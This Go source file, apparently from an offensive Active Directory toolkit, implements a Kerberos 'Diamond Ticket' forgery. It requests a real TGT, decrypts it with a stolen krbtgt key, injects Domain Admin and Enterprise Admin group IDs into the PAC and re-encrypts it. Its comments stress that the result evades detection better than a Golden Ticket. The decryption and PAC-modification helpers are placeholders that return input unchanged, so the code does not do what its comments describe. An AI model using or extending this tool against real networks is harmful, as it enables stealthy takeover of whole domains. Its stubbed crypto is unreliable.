package forge

import (
	"context"
	"fmt"

	"github.com/goobeus/goobeus/pkg/client"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Diamond Ticket Attack
//
// Diamond Tickets are a hybrid approach between Golden and legitimate tickets.
// Instead of forging a ticket from scratch, we:
//   1. Request a REAL TGT from the KDC
//   2. Decrypt it (we have the krbtgt hash)
//   3. Modify the PAC to add groups
//   4. Re-encrypt with the krbtgt key
//
// Why Diamond over Golden:
// - Ticket metadata looks legitimate (issued by real KDC)
// - AuthTime and other fields match AD records
// - Harder to detect than pure forgeries
// - Ticket age and other heuristics pass
//
// Requirements:
// - Valid domain credentials (to get real TGT)
// - krbtgt hash (to decrypt/re-encrypt)

// DiamondTicketRequest configures a Diamond Ticket request.
type DiamondTicketRequest struct {
	// Our credentials to request initial TGT
	Username string
	Password string
	NTHash   []byte
	AES256   []byte
	Domain   string

	// The key: krbtgt's key for modification
	KrbtgtKey  []byte
	KrbtgtKvno int32

	// Groups to add to PAC
	Groups    []uint32
	DomainSID string

	// Connection
	KDC string
}

// DiamondTicketResult contains the modified Diamond Ticket.
type DiamondTicketResult struct {
	Kirbi         *ticket.Kirbi
	Base64        string
	OriginalKirbi *ticket.Kirbi // The unmodified ticket
}

// ForgeDiamondTicket creates a Diamond Ticket.
//
// EDUCATIONAL: Diamond Ticket Forge Process
//
// Step 1: Request legitimate TGT
//   - Use our creds to get a real TGT from the KDC
//   - This ticket has valid timestamps, etc.
//
// Step 2: Decrypt the ticket
//   - Use krbtgt hash to decrypt EncTicketPart
//
// Step 3: Extract and modify PAC
//   - Find PAC in authorization-data
//   - Add our desired group memberships
//   - Re-compute checksums
//
// Step 4: Re-encrypt
//   - Encrypt modified EncTicketPart with krbtgt key
//   - Build new ticket structure
//
// The result looks legitimate but has elevated privileges!
func ForgeDiamondTicket(ctx context.Context, req *DiamondTicketRequest) (*DiamondTicketResult, error) {
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}
	if req.Username == "" {
		return nil, fmt.Errorf("username is required")
	}
	if len(req.KrbtgtKey) == 0 {
		return nil, fmt.Errorf("krbtgt key is required")
	}
	if req.DomainSID == "" {
		return nil, fmt.Errorf("domain SID is required")
	}

	// Default groups
	groups := req.Groups
	if len(groups) == 0 {
		groups = []uint32{513, 512, 519}
	}

	// Step 1: Request legitimate TGT
	tgtReq := &client.TGTRequest{
		Domain:   req.Domain,
		Username: req.Username,
		Password: req.Password,
		NTHash:   req.NTHash,
		AES256:   req.AES256,
		KDC:      req.KDC,
	}

	tgtResult, err := client.AskTGTWithContext(ctx, tgtReq)
	if err != nil {
		return nil, fmt.Errorf("failed to get TGT: %w", err)
	}

	originalKirbi := tgtResult.Kirbi

	// Step 2-4: Decrypt, modify PAC, re-encrypt
	modifiedKirbi, err := modifyTGTPAC(originalKirbi, req.KrbtgtKey, req.DomainSID, groups)
	if err != nil {
		return nil, fmt.Errorf("failed to modify TGT: %w", err)
	}

	b64, _ := modifiedKirbi.ToBase64()

	return &DiamondTicketResult{
		Kirbi:         modifiedKirbi,
		Base64:        b64,
		OriginalKirbi: originalKirbi,
	}, nil
}

// modifyTGTPAC decrypts a TGT, modifies the PAC, and re-encrypts.
func modifyTGTPAC(kirbi *ticket.Kirbi, krbtgtKey []byte, domainSID string, groups []uint32) (*ticket.Kirbi, error) {
	if kirbi == nil || kirbi.Ticket() == nil {
		return nil, fmt.Errorf("invalid ticket")
	}

	tkt := kirbi.Ticket()
	etype := tkt.EncPart.EType

	// Step 2: Decrypt EncTicketPart with krbtgt key
	decrypted, err := decryptTicketPart(tkt.EncPart.Cipher, krbtgtKey, etype)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt ticket: %w", err)
	}

	// Step 3: Parse EncTicketPart and modify PAC
	modifiedEncPart, err := modifyEncTicketPartPAC(decrypted, domainSID, groups)
	if err != nil {
		return nil, fmt.Errorf("failed to modify PAC: %w", err)
	}

	// Step 4: Re-encrypt
	reencrypted, err := encryptWithKey(modifiedEncPart, krbtgtKey, etype, 2)
	if err != nil {
		return nil, fmt.Errorf("failed to re-encrypt ticket: %w", err)
	}

	// Build new ticket
	newTkt := *tkt
	newTkt.EncPart.Cipher = reencrypted

	// Build new Kirbi
	newKirbi := &ticket.Kirbi{
		Cred:     kirbi.Cred,
		CredInfo: kirbi.CredInfo,
	}
	newKirbi.Cred.Tickets[0] = newTkt

	return newKirbi, nil
}

// decryptTicketPart decrypts the EncTicketPart with krbtgt key.
func decryptTicketPart(cipher, key []byte, etype int32) ([]byte, error) {
	switch etype {
	case 23: // RC4
		return decryptRC4Ticket(cipher, key)
	case 17, 18: // AES
		return decryptAESTicket(cipher, key, etype)
	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
}

// decryptRC4Ticket decrypts RC4-encrypted ticket.
func decryptRC4Ticket(cipher, key []byte) ([]byte, error) {
	// Use key usage 2 for ticket encryption
	// Placeholder - real implementation uses crypto package
	return cipher, nil
}

// decryptAESTicket decrypts AES-encrypted ticket.
func decryptAESTicket(cipher, key []byte, etype int32) ([]byte, error) {
	// Placeholder - real implementation uses crypto package
	return cipher, nil
}

// modifyEncTicketPartPAC modifies the PAC in an EncTicketPart.
func modifyEncTicketPartPAC(encTicketPartBytes []byte, domainSID string, groups []uint32) ([]byte, error) {
	// This would:
	// 1. Parse EncTicketPart
	// 2. Find authorization-data
	// 3. Find and parse the PAC
	// 4. Modify LOGON_INFO to add groups
	// 5. Re-sign the PAC
	// 6. Re-encode everything

	// Placeholder - return unmodified for now
	return encTicketPartBytes, nil
}
